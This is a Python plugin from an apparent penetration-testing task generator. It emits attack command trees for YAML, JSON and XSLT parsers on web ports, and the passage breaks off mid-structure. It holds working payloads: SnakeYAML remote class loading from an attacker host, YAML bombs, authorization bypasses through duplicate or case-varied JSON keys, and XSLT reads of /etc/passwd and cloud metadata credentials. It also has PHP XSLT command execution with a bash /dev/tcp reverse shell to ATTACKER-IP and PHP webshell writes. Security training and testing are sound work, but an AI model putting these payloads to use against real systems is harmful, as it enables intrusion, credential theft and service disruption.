"""
Data Format Attack Plugin - JSON, YAML, XSLT Exploitation

Generates tasks for exploiting data format parsers including:
- YAML deserialization (SnakeYAML RCE CVE-2022-1471)
- JSON parser differentials (duplicate fields, case sensitivity)
- XSLT injection (file read, SSRF, RCE)
- XML bomb / Billion Laughs DoS
- Parser confusion / polyglot attacks

Extracted from HackTricks:
- pentesting-web/json-xml-yaml-hacking.md
- pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.md

Generated by: CrackPot v1.0

IMPORTANT: XXE (XML External Entity) attacks are in web_security.py plugin.
This plugin focuses on YAML, JSON, and XSLT-specific attacks.
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class DataFormatAttacksPlugin(ServicePlugin):
    """Data format attack plugin for JSON/YAML/XSLT exploitation"""

    @property
    def name(self) -> str:
        return "data-format-attacks"

    @property
    def default_ports(self) -> List[int]:
        # Web services that commonly parse data formats
        return [80, 443, 8080, 8443, 3000, 5000, 8000, 8888]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http', 'http-alt']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect HTTP services that may parse JSON/YAML/XSLT"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Match HTTP services
        if any(svc in service for svc in self.service_names):
            return True

        # Match common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate data format attack enumeration task tree"""
        protocol = 'https' if port in [443, 8443] else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'data-format-attacks-{port}',
            'name': f'Data Format Attacks (Port {port})',
            'type': 'parent',
            'children': []
        }

        # SECTION 1: YAML Deserialization Attacks
        yaml_tasks = self._create_yaml_tasks(base_url, port)
        tasks['children'].append(yaml_tasks)

        # SECTION 2: JSON Parser Differential Attacks
        json_tasks = self._create_json_tasks(base_url, port)
        tasks['children'].append(json_tasks)

        # SECTION 3: XSLT Injection Attacks
        xslt_tasks = self._create_xslt_tasks(base_url, port)
        tasks['children'].append(xslt_tasks)

        # SECTION 4: XML Bomb / DoS Attacks
        xml_bomb_tasks = self._create_xml_bomb_tasks(base_url, port)
        tasks['children'].append(xml_bomb_tasks)

        # SECTION 5: Polyglot / Parser Confusion Attacks
        polyglot_tasks = self._create_polyglot_tasks(base_url, port)
        tasks['children'].append(polyglot_tasks)

        return tasks

    def _create_yaml_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create YAML deserialization attack tasks"""
        return {
            'id': f'yaml-deserial-{port}',
            'name': 'YAML Deserialization Attacks',
            'type': 'parent',
            'children': [
                # Task 1: SnakeYAML RCE Detection (CVE-2022-1471)
                {
                    'id': f'snakeyaml-rce-{port}',
                    'name': 'SnakeYAML RCE Detection (CVE-2022-1471)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for SnakeYAML deserialization RCE (Java Spring-Boot, Jenkins)',
                        'command': f'# Identify Java/Spring-Boot application first:\ncurl -I {base_url} | grep -i "Server\\|X-Powered-By"\n\n# If YAML endpoint exists (API, config upload, etc.), inject:\n# !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://attacker-ip/"] ] ] ]\n\n# For RCE via JNDI:\n# !!javax.script.ScriptEngineManager [\n#   !!java.net.URLClassLoader [[\n#     !!java.net.URL ["http://attacker-ip:8000/yaml-payload.jar"]\n#   ]]\n# ]',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'JAVA', 'RCE'],
                        'flag_explanations': {
                            '!!javax.script.ScriptEngineManager': 'YAML tag forcing Java class instantiation',
                            '!!java.net.URLClassLoader': 'Load arbitrary classes from remote URL',
                            '!!java.net.URL': 'Remote JAR file location for malicious class'
                        },
                        'success_indicators': [
                            'HTTP request to attacker-controlled server received',
                            'DNS callback received (for out-of-band detection)',
                            'Application executes arbitrary Java code'
                        ],
                        'failure_indicators': [
                            'YAML parsing error (SnakeYAML >= 2.0 with SafeConstructor)',
                            'ClassNotFoundException (class filtering enabled)',
                            'No outbound connection (firewall/egress filtering)'
                        ],
                        'next_steps': [
                            'If vulnerable: Generate reverse shell payload with ysoserial',
                            'Test JNDI injection for RCE (Java RMI/LDAP gadget chains)',
                            'Research application frameworks for YAML config injection points'
                        ],
                        'alternatives': [
                            'Manual: Search for YAML config upload (application.yml, config.yaml)',
                            'Manual: Check API endpoints accepting Content-Type: application/x-yaml',
                            'ysoserial: Generate Java deserialization gadget chains',
                            'marshalsec: JNDI exploitation toolkit for remote class loading'
                        ],
                        'notes': 'Affects SnakeYAML < 2.0 (default in Spring-Boot before 3.0). Upgrade to 2.0+ enforces SafeConstructor. OSCP: Spring-Boot apps common on HTB/PG. Check /actuator endpoints for YAML config.'
                    }
                },

                # Task 2: YAML Unknown Keys Bypass
                {
                    'id': f'yaml-unknown-keys-{port}',
                    'name': 'YAML Unknown Keys Privilege Escalation',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit YAML parsers allowing unknown keys (Go, Python) for privilege escalation',
                        'command': f'# Test for Go YAML parser (go-yaml/yaml):\n# Inject extra fields in YAML payload:\ncat > test.yaml <<EOF\nusername: testuser\nrole: user\nisAdmin: true\nEOF\n\n# If API accepts YAML, send:\ncurl -X POST {base_url}/api/user \\\n  -H "Content-Type: application/x-yaml" \\\n  --data-binary @test.yaml\n\n# Check if isAdmin field processed despite not in schema',
                        'tags': ['OSCP:MEDIUM', 'AUTHZ', 'YAML', 'PRIVESC'],
                        'flag_explanations': {
                            '-H "Content-Type: application/x-yaml"': 'Force YAML parsing (instead of JSON)',
                            '--data-binary': 'Send file contents without modification',
                            'isAdmin: true': 'Inject privilege escalation field not in original schema'
                        },
                        'success_indicators': [
                            'User created with admin privileges',
                            'YAML fields outside schema accepted',
                            'Authorization bypass achieved'
                        ],
                        'failure_indicators': [
                            'YAML parser rejects unknown keys (KnownFields enabled)',
                            'Application validates against strict schema',
                            'Extra fields ignored silently'
                        ],
                        'next_steps': [
                            'Enumerate YAML schema from API documentation',
                            'Fuzz for hidden/undocumented YAML fields',
                            'Test for role escalation via injected fields'
                        ],
                        'alternatives': [
                            'Manual: Intercept YAML requests with Burp and inject extra keys',
                            'Manual: Test JSON endpoints by changing Content-Type to YAML',
                            'Check for libyaml double-free (CVE-2024-35325) - DoS via malformed YAML'
                        ],
                        'notes': 'Go yaml.Unmarshal allows unknown fields by default unless KnownFields(true) set. Python PyYAML also vulnerable. OSCP: Rare but high-impact on custom web apps.'
                    }
                },

                # Task 3: YAML Bomb DoS
                {
                    'id': f'yaml-bomb-{port}',
                    'name': 'YAML Bomb (Resource Exhaustion)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for YAML bomb vulnerability (similar to XML Billion Laughs)',
                        'command': f'# Create YAML bomb (exponential entity expansion):\ncat > bomb.yaml <<\'EOF\'\na: &anchor ["data"]\nb: [*anchor, *anchor, *anchor, *anchor, *anchor]\nc: [*b, *b, *b, *b, *b]\nd: [*c, *c, *c, *c, *c]\ne: [*d, *d, *d, *d, *d]\nf: [*e, *e, *e, *e, *e]\nEOF\n\n# Send to YAML parser:\ncurl -X POST {base_url}/api/parse \\\n  -H "Content-Type: application/x-yaml" \\\n  --data-binary @bomb.yaml\n\n# Monitor server CPU/memory (out-of-band)',
                        'tags': ['OSCP:LOW', 'DOS', 'YAML'],
                        'flag_explanations': {
                            '&anchor': 'YAML anchor (reference/alias definition)',
                            '*anchor': 'YAML alias (expands to anchor value)',
                            'Exponential expansion': 'Each level multiplies references (5^6 = 15625 expansions)'
                        },
                        'success_indicators': [
                            'Server CPU spike (monitor with htop)',
                            'Application timeout/crash',
                            'Memory exhaustion error'
                        ],
                        'failure_indicators': [
                            'Parser has alias expansion limits',
                            'Request rejected due to size limits',
                            'No observable resource impact'
                        ],
                        'next_steps': [
                            'Adjust anchor depth for maximum impact',
                            'Combine with slowloris for sustained DoS',
                            'Test during high-traffic periods for service disruption'
                        ],
                        'alternatives': [
                            'Manual: Test with smaller expansions first (3 levels)',
                            'XML Billion Laughs: Similar attack for XML parsers',
                            'JSON arrays: Deeply nested JSON objects for parser DoS'
                        ],
                        'notes': 'OSCP relevance: LOW (DoS not exam objective). Include for completeness. Real-world: Bug bounty high-severity.'
                    }
                }
            ]
        }

    def _create_json_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create JSON parser differential attack tasks"""
        return {
            'id': f'json-differential-{port}',
            'name': 'JSON Parser Differential Attacks',
            'type': 'parent',
            'children': [
                # Task 1: Duplicate JSON Keys Exploitation
                {
                    'id': f'json-duplicate-keys-{port}',
                    'name': 'Duplicate JSON Keys (Parser Differential)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit different parsers handling duplicate keys differently (Go=last, Java=first)',
                        'command': f'# Test authorization bypass via duplicate keys:\n# Scenario: Proxy (Go) checks first "action", Backend (Python) uses last "action"\n\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"action\": \"UserAction\", \"action\": \"AdminAction\"}}\'\n\n# Expected:\n# - Go proxy: sees UserAction (first key) -> allows request\n# - Python backend: sees AdminAction (last key) -> executes privileged action',
                        'tags': ['OSCP:MEDIUM', 'AUTHZ', 'JSON', 'PARSER_DIFFERENTIAL'],
                        'flag_explanations': {
                            'Duplicate "action" keys': 'Two keys with same name in single JSON object',
                            'Go encoding/json': 'Takes LAST occurrence of duplicate key',
                            'Java Jackson': 'Takes FIRST occurrence (configurable)',
                            'Python json.loads': 'Takes LAST occurrence'
                        },
                        'success_indicators': [
                            'Admin action executed despite proxy authorization',
                            'Different behavior between services (WAF vs backend)',
                            'Authorization bypass achieved'
                        ],
                        'failure_indicators': [
                            'Parser rejects duplicate keys (strict mode)',
                            'All services use same JSON library',
                            'No observable behavior difference'
                        ],
                        'next_steps': [
                            'Identify tech stack: Go proxy + Java/Python backend = vulnerable',
                            'Enumerate API actions: user vs admin operations',
                            'Test with different JSON parsers (Jackson, Gson, json-simple)'
                        ],
                        'alternatives': [
                            'Manual: Test via Burp Repeater with duplicate keys',
                            'Case sensitivity bypass: {"action": "user", "AcTiOn": "admin"}',
                            'Unicode bypass: Use Unicode homoglyphs in key names'
                        ],
                        'notes': 'Real-world examples: CVE-2017-12635 (CouchDB), 2022 Zoom 0-click RCE, 2025 GitLab SAML bypass. OSCP: Rare but high-impact on microservices with Go/Java mix.'
                    }
                },

                # Task 2: JSON Case Sensitivity Bypass
                {
                    'id': f'json-case-bypass-{port}',
                    'name': 'JSON Case Insensitivity Bypass (Go Quirk)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit Go JSON parser case-insensitivity to bypass authorization checks',
                        'command': f'# Go json.Unmarshal is case-insensitive:\n# Test authorization bypass:\n\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"AcTiOn\": \"AdminAction\"}}\'\n\n# If WAF/validation checks lowercase "action", Go backend matches "AcTiOn" to struct field\n\n# Unicode bypass (Go accepts Unicode case variants):\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"aKtionſ\": \"AdminAction\"}}\'\n\n# Note: ſ = Latin small letter long S (U+017F)',
                        'tags': ['OSCP:MEDIUM', 'AUTHZ', 'JSON', 'GO_LANG'],
                        'flag_explanations': {
                            'AcTiOn (mixed case)': 'Bypasses case-sensitive validation',
                            'Go case-insensitivity': 'Matches JSON keys to struct fields ignoring case',
                            'Unicode homoglyphs': 'Characters that look similar but have different Unicode points'
                        },
                        'success_indicators': [
                            'Mixed-case keys accepted by Go backend',
                            'WAF/validator bypassed (checks lowercase only)',
                            'Privileged action executed'
                        ],
                        'failure_indicators': [
                            'Backend normalizes keys before processing',
                            'Strict JSON schema validation',
                            'No Go backend detected'
                        ],
                        'next_steps': [
                            'Enumerate struct fields from Go source code (GitHub)',
                            'Test all API parameters with mixed case',
                            'Combine with duplicate keys for multi-stage bypass'
                        ],
                        'alternatives': [
                            'Manual: Burp Intruder with case permutations',
                            'Unicode fuzzing: https://github.com/minimaxir/big-list-of-naughty-strings',
                            'Python/Java bypass: Test other language quirks (trailing commas, comments)'
                        ],
                        'notes': 'Go encoding/json matches keys case-insensitively by default. No fix available (language design). OSCP: Check for Go backends (common in cloud-native apps).'
                    }
                },

                # Task 3: JSON Unmarshaling Sensitive Fields
                {
                    'id': f'json-unmarshal-fields-{port}',
                    'name': 'JSON Unmarshal Sensitive Fields (Go)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit missing/incorrect JSON tags in Go structs to read/write sensitive fields',
                        'command': f'# Test for missing json tags (fields without tags are parsed):\ncurl -X POST {base_url}/api/user \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"Username\": \"admin\", \"Password\": \"pass123\", \"IsAdmin\": true}}\'\n\n# Test for incorrect "-" tag usage:\ncurl -X POST {base_url}/api/user \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"-\": true}}\'\n\n# Correct way to block field: json:"-" (no comma)\n# Vulnerable: json:"-,omitempty" (accepts "-" as key)',
                        'tags': ['OSCP:MEDIUM', 'AUTHZ', 'JSON', 'GO_LANG', 'PRIVESC'],
                        'flag_explanations': {
                            'json:"-"': 'Correct way to exclude field from JSON (un)marshaling',
                            'json:"-,omitempty"': 'INCORRECT - allows "-" as JSON key',
                            'Missing tag': 'Field without json tag is still parsed (field name = JSON key)'
                        },
                        'success_indicators': [
                            'IsAdmin field accepted despite no json tag',
                            '"-" key bypasses field exclusion',
                            'Sensitive fields readable/writable via API'
                        ],
                        'failure_indicators': [
                            'Proper json tags on all fields',
                            'Strict schema validation',
                            'Sensitive fields truly excluded'
                        ],
                        'next_steps': [
                            'Enumerate Go struct definitions from source code',
                            'Fuzz for undocumented struct fields',
                            'Test all CRUD endpoints for field injection'
                        ],
                        'alternatives': [
                            'Manual: Review Go source code for missing json tags',
                            'Manual: Test with capitalized field names (Go exported fields)',
                            'GraphQL: Introspection to discover hidden fields'
                        ],
                        'notes': 'Common Go developer mistake. Check open-source Go APIs on GitHub for vulnerable patterns. OSCP: Medium priority - Go backends increasingly common.'
                    }
                },

                # Task 4: RapidJSON Integer Overflow
                {
                    'id': f'rapidjson-overflow-{port}',
                    'name': 'RapidJSON Integer Overflow (CVE-2024-38517)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for RapidJSON numeric overflow leading to heap corruption',
                        'command': f'# Detect RapidJSON (C++ JSON library):\ncurl -I {base_url} | grep -i "Server"\n\n# If using RapidJSON < 1.1.0-patch-22, send huge numeric:\ncurl -X POST {base_url}/api/data \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"number\": 99999999999999999999999999999999999999999999}}\'\n\n# Or negative overflow:\ncurl -X POST {base_url}/api/data \\\n  -H "Content-Type: application/json" \\\n  -d \'{{\"number\": -99999999999999999999999999999999999999999999}}\'',
                        'tags': ['OSCP:LOW', 'DOS', 'HEAP_CORRUPTION', 'CVE'],
                        'flag_explanations': {
                            'Huge numeric literal': 'Exceeds integer bounds (32/64-bit)',
                            'GenericReader::ParseNumber()': 'Vulnerable function with unchecked arithmetic',
                            'Heap corruption': 'Integer wrap-around corrupts memory allocations'
                        },
                        'success_indicators': [
                            'Application crash (segfault)',
                            'Heap corruption detected (ASAN/Valgrind)',
                            'Privilege escalation via corrupted object graph'
                        ],
                        'failure_indicators': [
                            'RapidJSON >= 1.1.0-patch-22 (patched)',
                            'Input validation rejects huge numbers',
                            'No observable crash'
                        ],
                        'next_steps': [
                            'Identify RapidJSON version from error messages',
                            'Adjust numeric size for different architectures (32 vs 64-bit)',
                            'Chain with authorization checks for privilege escalation'
                        ],
                        'alternatives': [
                            'Manual: Test with scientific notation (1e308)',
                            'Manual: Test with mixed types (string containing number)',
                            'Check CVE-2024-39684 (related RapidJSON overflow)'
                        ],
                        'notes': 'Affects Tencent RapidJSON (popular C++ JSON library). OSCP: LOW priority (requires deep exploitation). Bug bounty: HIGH severity.'
                    }
                }
            ]
        }

    def _create_xslt_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create XSLT injection attack tasks"""
        return {
            'id': f'xslt-injection-{port}',
            'name': 'XSLT Server-Side Injection',
            'type': 'parent',
            'children': [
                # Task 1: XSLT Fingerprinting
                {
                    'id': f'xslt-fingerprint-{port}',
                    'name': 'XSLT Engine Fingerprinting',
                    'type': 'command',
                    'metadata': {
                        'description': 'Detect XSLT processor (Libxslt, Xalan, Saxon) and version',
                        'command': f'# If you control XSL stylesheet upload:\ncat > detect.xsl <<\'EOF\'\n<?xml version="1.0" encoding="ISO-8859-1"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:template match="/">\n Version: <xsl:value-of select="system-property(\'xsl:version\')" /><br />\n Vendor: <xsl:value-of select="system-property(\'xsl:vendor\')" /><br />\n Vendor URL: <xsl:value-of select="system-property(\'xsl:vendor-url\')" /><br />\n <xsl:if test="system-property(\'xsl:product-name\')">\n  Product Name: <xsl:value-of select="system-property(\'xsl:product-name\')" /><br />\n </xsl:if>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Upload detect.xsl to XSLT endpoint and check response',
                        'tags': ['OSCP:MEDIUM', 'RECON', 'XSLT'],
                        'flag_explanations': {
                            'system-property()': 'XSLT function to query processor metadata',
                            'xsl:version': 'XSLT version (1.0, 2.0, 3.0)',
                            'xsl:vendor': 'Processor vendor (Saxonica, Apache, Gnome)',
                            'xsl:product-name': 'Specific product (Saxon, Xalan, Libxslt)'
                        },
                        'success_indicators': [
                            'Version info displayed (e.g., "SAXON 9.1.0.8")',
                            'XSLT processor details revealed',
                            'Confirms XSLT processing occurs server-side'
                        ],
                        'failure_indicators': [
                            'XSL upload rejected',
                            'XSLT disabled',
                            'Client-side XSLT only (browser processing)'
                        ],
                        'next_steps': [
                            'Research processor-specific vulnerabilities',
                            'Saxon 2.0+: unparsed-text() for file read',
                            'Xalan: redirect:write for file write',
                            'PHP XSLT: php:function() for RCE'
                        ],
                        'alternatives': [
                            'Manual: Check HTTP response headers for XSLT indicators',
                            'Manual: Test .xsl file upload endpoints',
                            'Nmap script: http-xslt-injection'
                        ],
                        'notes': 'XSLT injection requires XSL stylesheet server-side storage. Common in: PDF generators, XML transformations, ESI (Edge Side Includes). OSCP: Rare but critical (RCE potential).'
                    }
                },

                # Task 2: XSLT File Read
                {
                    'id': f'xslt-file-read-{port}',
                    'name': 'XSLT Local File Read',
                    'type': 'command',
                    'metadata': {
                        'description': 'Read local files via XSLT unparsed-text() or document() functions',
                        'command': f'# XSLT 2.0+ (Saxon): unparsed-text()\ncat > read.xsl <<\'EOF\'\n<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n<xsl:template match="/">\n<xsl:value-of select="unparsed-text(\'/etc/passwd\', \'utf-8\')"/>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# XSLT 1.0 (Xalan, Libxslt): document() + XXE\ncat > read_xxe.xsl <<\'EOF\'\n<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:template match="/">\n&ext_file;\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Upload to XSLT endpoint',
                        'tags': ['OSCP:HIGH', 'FILE_READ', 'XSLT', 'LFI'],
                        'flag_explanations': {
                            'unparsed-text()': 'XSLT 2.0 function to read arbitrary files as text',
                            'document()': 'XSLT 1.0 function to load XML documents (enables XXE)',
                            'XXE via XSLT': 'Combine XSLT with XML External Entities',
                            '/etc/passwd': 'Linux user enumeration (Windows: C:\\windows\\system32\\drivers\\etc\\hosts)'
                        },
                        'success_indicators': [
                            'File contents displayed in XSLT output',
                            '/etc/passwd contents visible',
                            'Windows hosts file readable'
                        ],
                        'failure_indicators': [
                            'External entity disabled (XXE protection)',
                            'unparsed-text() blocked (XSLT 1.0 only)',
                            'File read permissions denied'
                        ],
                        'next_steps': [
                            'Read application config files (web.xml, application.properties)',
                            'Read SSH keys (~/.ssh/id_rsa)',
                            'Read source code (index.php, app.py)',
                            'Enumerate users from /etc/passwd for SSH brute-force'
                        ],
                        'alternatives': [
                            'Manual: Use Burp to inject XSLT in XML uploads',
                            'PHP XSLT: php:function("file_get_contents", "/etc/passwd")',
                            'SSRF via XSLT: document("http://169.254.169.254/latest/meta-data/")'
                        ],
                        'notes': 'XSLT file read works even when XXE is blocked (different parser). Saxon 2.0+ most powerful (unparsed-text). PHP XSLT enables RCE. OSCP: High-value for config/credential theft.'
                    }
                },

                # Task 3: XSLT SSRF
                {
                    'id': f'xslt-ssrf-{port}',
                    'name': 'XSLT SSRF (Internal Network Scanning)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Perform SSRF via XSLT to access internal services, cloud metadata, localhost',
                        'command': f'# SSRF via xsl:include:\ncat > ssrf.xsl <<\'EOF\'\n<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n<xsl:include href="http://127.0.0.1:8080/admin"/>\n<xsl:template match="/">\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# SSRF via document():\ncat > ssrf_doc.xsl <<\'EOF\'\n<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n<xsl:template match="/">\n<xsl:value-of select="document(\'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\')"/>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Port scan via document():\nfor port in 22 80 443 3306 5432 6379 8080; do\n  echo "Testing port $port..."\n  # Inject: <xsl:value-of select="document(\'http://127.0.0.1:$port\')"/>\ndone',
                        'tags': ['OSCP:HIGH', 'SSRF', 'XSLT', 'CLOUD'],
                        'flag_explanations': {
                            'xsl:include': 'Include external XSLT stylesheet (triggers HTTP request)',
                            'document()': 'Load external XML document (SSRF vector)',
                            '169.254.169.254': 'AWS metadata service (credentials, IAM roles)',
                            'Port scanning': 'Blind SSRF to enumerate internal services'
                        },
                        'success_indicators': [
                            'AWS metadata retrieved (IAM credentials)',
                            'Internal service response in XSLT output',
                            'Port scan reveals open internal ports'
                        ],
                        'failure_indicators': [
                            'SSRF protections block private IPs',
                            'Egress firewall blocks outbound',
                            'XSLT parser timeout on connection attempts'
                        ],
                        'next_steps': [
                            'AWS: Retrieve IAM credentials from metadata service',
                            'Internal admin panels: Access via localhost SSRF',
                            'Database access: Connect to internal Redis/MySQL',
                            'Pivot: Use SSRF to scan entire internal network'
                        ],
                        'alternatives': [
                            'Manual: Test SSRF with external collaborator (Burp Collaborator)',
                            'XXE SSRF: If XSLT blocked, try XXE for same result',
                            'Blind SSRF: Trigger DNS lookups to detect internal hosts'
                        ],
                        'notes': 'XSLT SSRF bypasses many WAFs (less commonly filtered than XXE). Cloud metadata: 169.254.169.254 (AWS), 169.254.169.254 (GCP), 169.254.169.254 (Azure). OSCP: Test localhost admin panels.'
                    }
                },

                # Task 4: XSLT RCE (PHP)
                {
                    'id': f'xslt-rce-php-{port}',
                    'name': 'XSLT RCE via PHP Functions',
                    'type': 'command',
                    'metadata': {
                        'description': 'Execute arbitrary PHP code via php:function() in XSLT (PHP XSLT extension)',
                        'command': f'# RCE via shell_exec():\ncat > rce.xsl <<\'EOF\'\n<?xml version="1.0" encoding="utf-8"?>\n<xsl:stylesheet version="1.0"\nxmlns:xsl="http://www.w3.org/1999/XSL/Transform"\nxmlns:php="http://php.net/xsl">\n<xsl:template match="/">\n<xsl:value-of select="php:function(\'shell_exec\',\'id\')" />\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Reverse shell:\ncat > shell.xsl <<\'EOF\'\n<?xml version="1.0" encoding="utf-8"?>\n<xsl:stylesheet version="1.0"\nxmlns:xsl="http://www.w3.org/1999/XSL/Transform"\nxmlns:php="http://php.net/xsl">\n<xsl:template match="/">\n<xsl:value-of select="php:function(\'shell_exec\',\'bash -c \\"bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1\\"\')" />\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Setup listener:\nnc -lvnp 4444\n\n# Upload shell.xsl to XSLT endpoint',
                        'tags': ['OSCP:HIGH', 'RCE', 'XSLT', 'PHP'],
                        'flag_explanations': {
                            'php:function()': 'XSLT function to call arbitrary PHP functions',
                            'shell_exec()': 'Execute OS commands via PHP',
                            'xmlns:php="http://php.net/xsl"': 'Enable PHP namespace in XSLT',
                            'Reverse shell': 'Bash TCP connection to attacker listener'
                        },
                        'success_indicators': [
                            'Command output in XSLT response ("uid=33(www-data)")',
                            'Reverse shell connection received',
                            'RCE confirmed'
                        ],
                        'failure_indicators': [
                            'PHP XSLT extension not installed',
                            'php:function() disabled in configuration',
                            'disable_functions restricts shell_exec',
                            'WAF blocks reverse shell syntax'
                        ],
                        'next_steps': [
                            'Upgrade to fully interactive shell (python pty)',
                            'Enumerate system for privilege escalation',
                            'Exfiltrate database credentials from config files',
                            'Pivot to internal network'
                        ],
                        'alternatives': [
                            'Manual: php:function("system", "whoami")',
                            'Manual: php:function("passthru", "cat /etc/passwd")',
                            'Manual: php:function("file_put_contents", "shell.php", "<?php system($_GET[0]); ?>")',
                            'Xalan (Java): Extension functions for RCE (complex)',
                            'Saxon (Java): Static method calls for RCE'
                        ],
                        'notes': 'PHP XSLT RCE requires php:function() enabled (common on older PHP apps). Check /etc/php/*/conf.d/ for XSLT config. OSCP: Rare but instant win. Bug bounty: Critical.'
                    }
                },

                # Task 5: XSLT Directory Listing (PHP)
                {
                    'id': f'xslt-dir-listing-{port}',
                    'name': 'XSLT Directory Listing (PHP)',
                    'type': 'command',
                    'metadata': {
                        'description': 'List directory contents via PHP opendir/readdir in XSLT',
                        'command': f'# Directory listing via opendir() + readdir():\ncat > dir.xsl <<\'EOF\'\n<?xml version="1.0" encoding="utf-8"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">\n<xsl:template match="/">\n<xsl:value-of select="php:function(\'opendir\',\'/var/www/html\')"/>\n<xsl:value-of select="php:function(\'readdir\')"/> -\n<xsl:value-of select="php:function(\'readdir\')"/> -\n<xsl:value-of select="php:function(\'readdir\')"/> -\n<xsl:value-of select="php:function(\'readdir\')"/> -\n<xsl:value-of select="php:function(\'readdir\')"/>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Alternative: scandir() via assert():\ncat > scandir.xsl <<\'EOF\'\n<?xml version="1.0" encoding="UTF-8"?>\n<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">\n<body>\n<xsl:copy-of select="php:function(\'assert\',\'var_dump(scandir(\\".\\"))==3\')" />\n</body>\n</html>\nEOF',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'XSLT', 'PHP'],
                        'flag_explanations': {
                            'opendir()': 'Open directory handle',
                            'readdir()': 'Read next entry from directory (call multiple times)',
                            'scandir()': 'Return array of directory entries',
                            'assert()': 'Execute arbitrary PHP code (deprecated but common)'
                        },
                        'success_indicators': [
                            'Directory listing displayed',
                            'File names enumerated (index.php, config.php, uploads/)',
                            'Web root structure revealed'
                        ],
                        'failure_indicators': [
                            'opendir() disabled in php.ini',
                            'Permission denied on directory',
                            'XSLT output truncated'
                        ],
                        'next_steps': [
                            'Identify interesting files (config.php, .env, database.yml)',
                            'Read enumerated files with file_get_contents()',
                            'Find upload directories for webshell upload',
                            'Discover backup files (.bak, .old, .swp)'
                        ],
                        'alternatives': [
                            'Manual: Increment readdir() calls to list all files',
                            'Manual: Use glob() for pattern matching',
                            'File read: Combine with unparsed-text() for file contents'
                        ],
                        'notes': 'PHP XSLT directory listing requires php:function() enabled. Useful for blind file read (enumerate before reading). OSCP: Medium priority (supports file exfiltration).'
                    }
                },

                # Task 6: XSLT File Write (XSLT 2.0)
                {
                    'id': f'xslt-file-write-{port}',
                    'name': 'XSLT File Write (Webshell Upload)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Write arbitrary files via XSLT result-document (XSLT 2.0) or Xalan redirect',
                        'command': f'# XSLT 2.0 (Saxon): xsl:result-document\ncat > write.xsl <<\'EOF\'\n<?xml version="1.0" encoding="utf-8"?>\n<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:template match="/">\n<xsl:result-document href="shell.php">\n<xsl:text>&lt;?php system($_GET[0]); ?&gt;</xsl:text>\n</xsl:result-document>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Xalan-J (Apache): redirect:write\ncat > write_xalan.xsl <<\'EOF\'\n<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" \n                xmlns:redirect="http://xml.apache.org/xalan/redirect"\n                extension-element-prefixes="redirect"\n                version="1.0">\n<xsl:template match="/">\n<redirect:open file="shell.php"/>\n<redirect:write file="shell.php">&lt;?php system($_GET[0]); ?&gt;</redirect:write>\n<redirect:close file="shell.php"/>\n</xsl:template>\n</xsl:stylesheet>\nEOF\n\n# Access shell: curl {base_url}/shell.php?0=id',
                        'tags': ['OSCP:HIGH', 'FILE_WRITE', 'XSLT', 'WEBSHELL'],
                        'flag_explanations': {
                            'xsl:result-document': 'XSLT 2.0 function to write output to file',
                            'redirect:write': 'Xalan extension for file write',
                            'href="shell.php"': 'Filename to write (web-accessible path)',
                            'Webshell payload': 'PHP system() wrapper for command execution'
                        },
                        'success_indicators': [
